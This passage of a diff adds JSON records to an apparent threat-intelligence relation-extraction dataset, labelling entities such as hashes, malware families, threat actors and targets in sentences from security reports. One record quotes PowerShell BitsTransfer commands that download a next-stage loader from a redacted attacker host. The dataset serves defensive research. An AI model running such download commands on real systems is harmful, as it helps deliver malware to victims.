+    "marked_text":" Trojan.W97M.CONFUCIUS.B  654c7021a4482da21e149ded58643b279ffbce66badf1a0a7fc3551acd607312  [E2] Trojan.W97M.CONFUCIUS.C [\/E2]  [E1] 712172b5b1895bbfcced961a83baa448e26e93e301be407e6b9dc8cb6526277f [\/E1]  Trojan.Win32.DLOADR.TIOIBELQ",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9eed9a2e0edf38f6354f4e57b3a6b9bed5b19263f54bcee19e66fc8af0c29e4e  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9f34d28562e7e1e3721bbf679c58aa8f5898995ed999a641f26de120f3a42cf4  Silverlight1.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9ff906ffcde32e4c6fb3ea4652e6d6326713a7fde8bb783b52f12a1f382f8798  test.exe  BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  [E1] a7c4dac7176e291bd2aba860e1aa301fb5f7d880794f493f2dea0982e2b7eb31 [\/E1]  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b48e01ff816f12125f9f4cfc9180d534c7c57ef4ee50c0ebbe445e88d4ade939  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b82bde3fe5ee900a76ac27b4869ed9aa0802c63bbd72b3bfb0f1abce6340cc6c  Silverlight_ins.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b9d0838be8952ebd4218c8f548ce94901f789ec1e32f5eaf46733f0c94c77999  Silverlight_ins.exe  ",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  [E1] 2b580af1cdc4655ae75ef503aba7600e05cdd68b056a9354a2184b7fbb24db6f [\/E1]  Silverlight_ins.exe  ",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  [E1] 5fd2da648068f75a4a66b08d6d93793f735be62ae88085a79d839b6a0d6d859a [\/E1]  flash1.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  660cef8210f823acb0b31d78fbce1d6f3f8c4f43231286f7ac69f75b2c42c020  flashplayerpp_install_cn.exe",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"Decompiled Form structure of Patchwork\u2019s sample ([E1] 795ae4097aa3bd5932be4110f6bd992f46d605d4c9e3afced314454d35395a59 [\/E1], Detected as [E2] TROJ_DELF.XXWZ [\/E2])",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c11906210465045a54a5de1053ce0624308a8c7b342bb707a24e534ca662dc89  test-flash.exe  BIOPASS RAT Loader  Backdoor.Win32.BIOPASS.A  c3fa69e15a63b151f8d1dc3018284e153ad2eb672d54555eaeaac79396b64e3b  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5  flashplayerpp_install_cn.exe  BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  c8542bffc7a2074b8d84c4de5f18e3c8ced30b1f6edc13047ce99794b388285c  [E1] flash2.exe [\/E1]  BIOPASS RAT Loader  Backdoor.",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":".Python.BIOPASS.A  34be85754a84cc44e5bb752ee3a95e2832e7be1f611dd99e9a1233c812a6dad2  [E1] c1222.txt [\/E1]  [E2] BIOPASS RAT [\/E2] Python Script (C1222 module)  Trojan",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"test3.exe  [E2] BIOPASS RAT [\/E2] Loader  Backdoor.Win64.BIOPASS.A  [E1] 281c938448e32eb12fe8c5439ef06cea848668cf57fed5ad64b9a8d1e07de561 [\/E1]",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  [E1] c11906210465045a54a5de1053ce0624308a8c7b342bb707a24e534ca662dc89 [\/E1]  test-flash.exe  BIOPASS RAT Loader  Backdoor.Win32.BIOPASS.A  c3fa69e15a63b151f8d1dc3018284e153ad2eb672d54555eaeaac79396b64e3b  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5  flashplayerpp_install_cn.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c8542bffc7a2074b8d84c4de5f18e3c8ced30b1f6edc13047ce99794b388285c  flash2.exe  BIOPASS RAT Loader  Backdoor.",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9eed9a2e0edf38f6354f4e57b3a6b9bed5b19263f54bcee19e66fc8af0c29e4e  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9f34d28562e7e1e3721bbf679c58aa8f5898995ed999a641f26de120f3a42cf4  Silverlight1.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9ff906ffcde32e4c6fb3ea4652e6d6326713a7fde8bb783b52f12a1f382f8798  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  a7c4dac7176e291bd2aba860e1aa301fb5f7d880794f493f2dea0982e2b7eb31  test.exe  BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  b48e01ff816f12125f9f4cfc9180d534c7c57ef4ee50c0ebbe445e88d4ade939  [E1] test.exe [\/E1]  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b82bde3fe5ee900a76ac27b4869ed9aa0802c63bbd72b3bfb0f1abce6340cc6c  Silverlight_ins.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b9d0838be8952ebd4218c8f548ce94901f789ec1e32f5eaf46733f0c94c77999  Silverlight_ins.exe  ",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  2b580af1cdc4655ae75ef503aba7600e05cdd68b056a9354a2184b7fbb24db6f  [E1] Silverlight_ins.exe [\/E1]  ",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":".Python.BIOPASS.A  e479823aa41d3f6416233dba8e765cf2abaa38ad18328859a20b88df7f1d88d5  sc2.txt  BIOPASS RAT encoded Cobalt Strike shellcode  [E2] Trojan.Win32.COBEACON.A [\/E2]  e567fd0f08fdafc5a89c9084373f3308ef464918ff7e4ecd7fb3135d777e946d  [E1] sc3.txt [\/E1]",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  d18d84d32a340d20ab07a36f9e4b959495ecd88d7b0e9799399fcc4e959f536b  [E1] flash_installer.exe [\/E1]",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  [E1] fa1d70b6b5b1a5e478c7d9d840aae0cc23d80476d9eea884a73d1b7e3926a209 [\/E1]  64.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  fa7fbca583b22d92ae6d832d90ee637cc6ac840203cd059c6582298beb955aee  test.exe  BIOPASS RAT Loader  Backdoor.",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"Indicators of compromise  Filename  Path  SHA-256  Detection  Notes  ss.exe  C:\\temp\\  ee63b49aca1495a170ea7273316385b606f3fd2df1e48e9f4de0f241d98bd055  HackTool.Win32.CATLIKE.A  Vulnerability Scanner  LG.exe  C:\\temp\\ C:\\hp\\  5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9  HackTool.Win32.JoeWare.A.  JoeWare Local Group Manipulation tool  LG.dat  C:\\hp\\  5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9  HackTool.Win32.JoeWare.A.  JoeWare Local Group Manipulation tool  mpBD6D42.dat  C:\\Users C:\\Perflogs [E1] C:\\hp C:\\temp [\/E1]  e9be71848d1faa0c41db4c6a1e901747d98fb0b3cca027f8be85ea5e339b75e3  [E2] HackTool.MSIL.Mimikatz.AF [\/E2]  Mimikatz       Tags  Endpoints | APT & Targeted Attacks | Research | Network | Articles, News, Reports",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":" Backdoor.Win64.BIOPASS.A  0f18694b400e14eb995003541f16f75a5afc2478cc415a6295d171ba93565a82  [E1] flash_installer.exe [\/E1]  [E2] BIOPASS RAT [\/E2] Loader  Backdoor.Win64.BIOPASS.A  11b785e77cbfa2d3849575cdfabd85d41bae3f2e0d33a77e7e2c46a45732d6e4  System.exe",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"Indicators of Compromise (IoCs)      SHA256  Filename  Note  Analysis  84fbf74896d2a1b62d73b9a5d0be2f627d522fc811fe08044e5485492d2d4249  big.txt  BIOPASS RAT Python Script (Version 3)  TrojanSpy.Python.BIOPASS.A  f3c96145c9d6972df265e12accfcd1588cee8af1b67093011e31b44d0200871f  c1222.txt  BIOPASS RAT Python Script (C1222 module)  Trojan.Python.BIOPASS.A  [E1] 0f8a87ca5f94949904804442c1a0651f99ba17ecf989f46a3b2fde8de455c4a4 [\/E1]  c1222.txt  [E2] BIOPASS RAT [\/E2] Python Script (C1222 module)  Trojan.Python.BIOPASS.A  d8b1c4ad8f31c735c51cb24e9f767649f78ef5c571769fbaac9891c899c33444  c1222.txt  BIOPASS RAT Python Script (C1222 module)  ",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"After infection, [E2] Virlock [\/E2] hides the file extension through modification of the registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt = 1, [E1] HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden [\/E1] = 2).",
+    "head_type":"REGISTRYKEY",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"The campaign initially compromised [E1] e-commerce online shops [\/E1] in Japan, Australia, and [E2] European [\/E2] countries via spam emails with malicious attachments.",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"And before long, Yuki Chen ([E1] @guhe120 [\/E1]), a [E2] Chinese [\/E2] researcher, posted his answer.",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"[E1] COLDRIVER [\/E1], a [E2] Russian [\/E2]-based threat actor sometimes referred to as Callisto, continues to send credential phishing emails to targets including government and defense officials, politicians, NGOs and think tanks, and journalists.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":" Apart from [E2] Argentinian [\/E2] eCommerce provider Mercado Libre \/ [E1] Mercado Pago [\/E1], subsequent victimology has departed South America and pivoted to focus on the high-tech sector.  Recent public victims have included:  It should be understood that in addition there are likely any number of other victims, targeted by attacks not known in the public sphere.",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"The campaign initially compromised [E1] e-commerce online shops [\/E1] in Japan, [E2] Australia [\/E2], and European countries via spam emails with malicious attachments.",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"The Sofacy Group (AKA APT28, Grizzly Steppe, [E1] Fancy Bear [\/E1], STRONTIUM, Sednit, Tsar Team, Pawn Storm) is a well-known hacking organization widely reported to be associated with [E2] Russia [\/E2] by the US Intelligence Community, numerous media reports and other cybersecurity companies.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"In this blog, we explore some of the most notable campaigns we\u2019ve disrupted this year from a different government-backed attacker: [E1] APT35 [\/E1], an [E2] Iranian [\/E2] group, which regularly conducts phishing campaigns targeting high risk users.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"The recent campaigns target [E1] senior positions [\/E1] in the United States and [E2] Canada [\/E2].",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"In March 2021, Microsoft kicked off the patch cycle early after releasing an advisory regarding the mass exploitation of four zero-days vulnerabilities by a [E2] Chinese [\/E2] Hacking group, [E1] HAFNIUM [\/E1], on the on-premises versions of the Microsoft Exchange Server.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"Tropic Trooper, a threat actor group that targets government, military, healthcare, transportation, and [E1] high-tech industries [\/E1] in [E2] Taiwan [\/E2], the Philippines, and Hong Kong, has been active since 2011.",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"It is associated with the cyberespionage group BlackTech, which mainly targets [E1] technology companies [\/E1] and government agencies in [E2] East Asia  [\/E2](specifically Taiwan, and in some instances, Japan and Hong Kong) and is responsible for some infamous campaigns such as PLEAD and Shrouded Crossbow.",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"located-at",
+    "label":18
+  },
+  {
+    "marked_text":"A series of ongoing [E1] business email compromise (BEC) campaigns [\/E1] that uses spear-phishing schemes on Office 365 accounts has been seen targeting business executives of over 1,000 companies across the world [E2] since March 2020 [\/E2].",
+    "head_type":"campaign",
+    "tail_type":"TIME",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":" According to ESET, the initial infection vector for [E1] Bad Rabbit [\/E1] is through a fake [E2] Adobe Flash [\/E2] update that is offered up from compromised websites.",
+    "head_type":"malware",
+    "tail_type":"SOFTWARE",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":" All of the domains currently resolve to [E1] 151.248.115.146 [\/E1], a Russian IP address and have WhoIs records associated with the e-mail address \u201c[E2] ladomfichisi1987@mail.ru [\/E2]\u201d.",
+    "head_type":"IPV4",
+    "tail_type":"EMAIL",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":" On April 8, we updated this blog to include statistics on [E1] SpringShell [\/E1] exploitation attempts that we identified by analyzing hits on the [E2] Spring Core Remote Code Execution Vulnerability [\/E2] threat prevention signature for the Palo Alto Networks Next-Generation Firewall, as well as alerts triggered in Cortex XDR.",
+    "head_type":"vulnerability",
+    "tail_type":"vulnerability",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"[E1] Tropic Trooper [\/E1], a threat actor group that targets government, military, healthcare, transportation, and high-tech industries in Taiwan, the Philippines, and Hong Kong, has been active [E2] since 2011 [\/E2].",
+    "head_type":"threat-actor",
+    "tail_type":"TIME",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"Back in February, we noted the similarities between the [E1] Patchwork [\/E1] and [E2] Confucius [\/E2] groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in South Asia.",
+    "head_type":"threat-actor",
+    "tail_type":"threat-actor",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"In a July email sent to a [E1] C-level executive [\/E1], we learned that the base domain URL is [E2] U10450540[.]ct[.]sendgrid[.]net, [\/E2] with the final URL being *getting-panes[.]sfo2*.      Figure 3.",
+    "head_type":"identity",
+    "tail_type":"URL",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":", we were able to observe another GitHub account with the name [E2] l4ckyguy [\/E2], sharing the profile picture, location and URL in the description, with a link to the previously observed account ([E1] x4kme [\/E1]), and a name, Ivan Topor, which we believe may be another alias for this threat actor.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"The [E1] Gh0st RAT [\/E1] samples related to this campaign are obfuscated executable files, which decrypt the main payload in memory and execute its main export function named \u201c[E2] Shellex [\/E2].\u201d      Figure",
+    "head_type":"malware",
+    "tail_type":"FILEPATH",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"    We can see how the [E1] Freenki  [\/E1]malware, previous [E2] SLUB  [\/E2]campaigns, and Operation Earth Kitsune share many common TTPs in their delivery and persistence mechanisms.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"[E2] Jon Clay, [\/E2] Director of Global Threat Communications at [E1] Trend Micro [\/E1], outlines the phases of ransomware:  ",
+    "head_type":"identity",
+    "tail_type":"identity",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"The name of the [E1] web shell [\/E1] file is hardcoded to be either \u201c[E2] ec_ver.php, [\/E2]\u201d \u201clog3.php,\u201d or \u201ctemp.php.\u201d",
+    "head_type":"attack-pattern",
+    "tail_type":"FILEPATH",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"The source code of this [E1] framework [\/E1] is shared across many [E2] Chinese [\/E2] public forums.",
+    "head_type":"tools",
+    "tail_type":"location",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":"(Note that Flash has been declared end-of-life by Adobe since December 31, 2020.)  If the victim downloads and executes the installer downloaded from this page, the victim will be infected with a variant of [E1] Gh0stRat [\/E1] malware, previously also named [E2] Gh0stCringe [\/E2] or CineregRAT.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"related-to",
+    "label":21
+  },
+  {
+    "marked_text":" [E1] Sofacy Group [\/E1] has been associated with many attacks against targets around the world, including the International Olympic Committee (IOC) in 2018, the World Anti-Doping Agency in 2016, the [E2] Dutch Safety Board [\/E2] in 2015, and German, French, Ukrainian, and Dutch political and military targets throughout 2014 through 2018.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Recently observed Ghostwriter credential phishing domains and emails: [E1] Curious Gorge [\/E1], a group TAG attributes to China's PLA SSF, has remained active against government, military, logistics and manufacturing organizations in Ukraine, [E2] Russia [\/E2] and Central Asia.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"MITRE also identifies different main targets for each group: While [E1] Carbanak [\/E1] focuses on [E2] banking institutions [\/E2], FIN7 targets food, hospitality, and retail establishments.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"All five [E1] phishing campaigns [\/E1] targeted a [E2] Japanese manufacturing [\/E2] firm over the course of two months, but the final campaign also targeted a separate Japanese high-tech organization.",
+    "head_type":"attack-pattern",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"This post was substantially updated March 31 to add information on [E1] phishing and scam attacks [\/E1], cybersquatting trends, fake donation websites, DoS attacks on [E2] Ukrainian news sites [\/E2] and distribution of malicious binaries.",
+    "head_type":"attack-pattern",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Some of the delivered [E1] malicious scripts [\/E1] attempt to install backdoors to the websites built with the [E2] EC-CUBE framework [\/E2], which is popular in Japan.",
+    "head_type":"malware",
+    "tail_type":"tools",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"A cybersquatting domain save-russia[.]today is launching [E1] DoS attacks [\/E1] on [E2] Ukrainian news sites [\/E2].",
+    "head_type":"attack-pattern",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Many [E1] Russian government cyber assets [\/E1] have remained focused on [E2] Ukraine [\/E2] and related issues since the invasion began, while Russian APT activity outside of Ukraine largely remains the same.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"A recent campaign from an Indian [E1] hack-for-hire operator [\/E1] was observed targeting an IT company in [E2] Cyprus [\/E2], an education institution in Nigeria, a fintech company in the Balkans and a shopping company in Israel.",
+    "head_type":"identity",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":" [E1] Sofacy Group [\/E1] has been associated with many attacks against targets around the world, including the [E2] International Olympic Committee (IOC) [\/E2] in 2018, the World Anti-Doping Agency in 2016, the Dutch Safety Board in 2015, and German, French, Ukrainian, and Dutch political and military targets throughout 2014 through 2018.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"The vendors that were targeted by [E1] VPNFilter [\/E1] were [E2] Asus [\/E2], D-Link, Huawei, Linksys, MikroTik, Netgear, QNAP, TP-Link, Ubiquiti, UPVEL, and ZDE.",
+    "head_type":"malware",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"One cluster of this activity frequently targets government, healthcare, and telecom sectors in [E2] Saudi Arabia [\/E2], the United Arab Emirates, and Bahrain with [E1] credential phishing campaigns [\/E1].",
+    "head_type":"campaign",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Overview Palo Alto Networks Unit 42 threat research team has just uncovered a new set of attacks by the [E1] Sofacy group [\/E1] using malicious emails targeting foreign affairs agencies and ministries in North America and [E2] Europe [\/E2], including a European embassy in Moscow.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"We found that [E1] Tropic Trooper [\/E1]\u2019s latest activities center on targeting Taiwanese and the Philippine [E2] military\u2019s  [\/E2]physically isolated networks through a USBferry attack (the name derived from a sample found in a related research).",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Recently observed IPs used in Curious Gorge campaigns: [E1] COLDRIVER [\/E1], a Russian-based threat actor sometimes referred to as Calisto, has launched credential phishing campaigns, targeting several [E2] US based NGOs and think tanks [\/E2], the military of a Balkans country, and a Ukraine based defense contractor.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Here is a deeper look at the campaign activity TAG has observed over the past two weeks: [E1] Curious Gorge [\/E1], a group TAG attributes to China's PLA SSF, has conducted campaigns against government and military organizations in [E2] Ukraine [\/E2], Russia, Kazakhstan, and Mongolia.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"The hot spots in the United States represents distribution servers which are created using fraud based accounts at various hosting providers that are hosting the [E1] Hancitor [\/E1] documents while the hotspots in [E2] Asia [\/E2] represent legitimate sites for small and medium businesses that have been compromised by the actors behind Hancitor campaign to host the malicious Hancitor documents.",
+    "head_type":"malware",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"The vendors that were targeted by [E1] VPNFilter [\/E1] were Asus, D-Link, Huawei, Linksys, MikroTik, Netgear, QNAP, [E2] TP-Link [\/E2], Ubiquiti, UPVEL, and ZDE.",
+    "head_type":"malware",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"A series of ongoing [E1] business email compromise (BEC) campaigns [\/E1] that uses spear-phishing schemes on Office 365 accounts has been seen targeting [E2] business executives [\/E2] of over 1,000 companies across the world since March 2020.",
+    "head_type":"campaign",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Recently observed [E1] COLDRIVER [\/E1] indicators: In another campaign tracked by CERT-UA as UAC-0056 we observed compromised email addresses of a [E2] Regional Prosecutor\u2019s office of Ukraine [\/E2] leveraged to send malicious Microsoft Excel documents with VBA macros delivering Cobalt Strike.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"Many [E1] Russian government cyber assets [\/E1] have remained focused on [E2] Ukraine [\/E2] and related issues since the invasion began, while Russian APT activity outside of Ukraine largely remains the same.",
+    "head_type":"threat-actor",
+    "tail_type":"location",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"MITRE also identifies different main targets for each group: While Carbanak focuses on banking institutions, [E1] FIN7 [\/E1] targets [E2] food, hospitality, and retail establishments [\/E2].",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"targets",
+    "label":22
+  },
+  {
+    "marked_text":"During our investigation into the [E1] Turla [\/E1] [E2] CyberAzov [\/E2] apps, we identified another Android app first seen in the wild in March 2022 that also claimed to conduct DoS attacks against Russian websites.",
+    "head_type":"threat-actor",
+    "tail_type":"malware",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"After this, the [E1] Carbanak backdoor [\/E1] can then be used to log keystrokes and capture screenshots, [E2] steal and delete cookies [\/E2], inject malicious code on sites, and monitor various traffic.",
+    "head_type":"malware",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"Next, let\u2019s look for the attribute indicator, starting with the [E2] CyaX [\/E2] assembly used in the [E1] NotepadEx [\/E1] attack.",
+    "head_type":"campaign",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"Taken together, this led us to believe that [E1] Water Pamola [\/E1] places orders with this embedded [E2] XSS [\/E2] script across many targeted online shops.",
+    "head_type":"campaign",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":" [E1] CVE-2022-22954 [\/E1], a remote code execution (RCE) vulnerability due to [E2] server-side template injection [\/E2] in VMware Workspace ONE Access and Identity Manager, is trivial to exploit with a single HTTP request to a vulnerable device.",
+    "head_type":"vulnerability",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"After the [E1] threat actors [\/E1] get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use [E2] bitsadmin [\/E2] to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin). C:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command \"&{Import-Module BitsTransfer; Start-BitsTransfer 'http:\/\/<redacted>:8000\/dfmanager.exe' \"%temp%\/dfmanager.exe\"}\" C:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command \"&{Import-Module BitsTransfer; Start-BitsTransfer 'http:\/\/<redacted>:8000\/dfmanager.bin' \"C:\\Users\\<redacted>\\AppData\\Local\\Temp\/dfmanager.bin\"}\"",
+    "head_type":"threat-actor",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"[E2] Spear Phishing [\/E2] Attacks Target Organizations in Ukraine, Payloads Include the Document Stealer OutSteel and the Downloader [E1] SaintBot [\/E1] Threat Briefing: Protecting Against Russia-Ukraine Cyber Activity Palo Alto Networks Resource Page: Protect Against Russia-Ukraine Cyber Activity Cortex XDR Protections Against Malware Associated with Ukraine and Russia Cyber Activity",
+    "head_type":"malware",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"In our new research blog \u201cFreeMilk: A Highly Targeted Spear Phishing Campaign\u201d, our Unit 42 research team has discovered an attack [E1] campaign [\/E1] that takes [E2] spear phishing [\/E2] targeting to the next level by hijacking in-progress email conversations.",
+    "head_type":"campaign",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"The main script used to manipulate traffic with [E2] WinDivert [\/E2]     Potential links with the [E1] Winnti group [\/E1]",
+    "head_type":"threat-actor",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"Here\u2019s a summary of [E1] Blackgear\u2019s latest campaign [\/E1]:  Use a [E2] decoy document or fake installer file [\/E2], sent via spam email to lure a potential victim into clicking it.",
+    "head_type":"campaign",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"[E1] Virlock [\/E1] has the largest number of variants due to its [E2] file-infector-like behavior [\/E2].",
+    "head_type":"malware",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"This particular IP was linked to a [E2] Contabo [\/E2] server that [E1] x4k [\/E1] had also included within their VirusTotal graph discussed above.",
+    "head_type":"threat-actor",
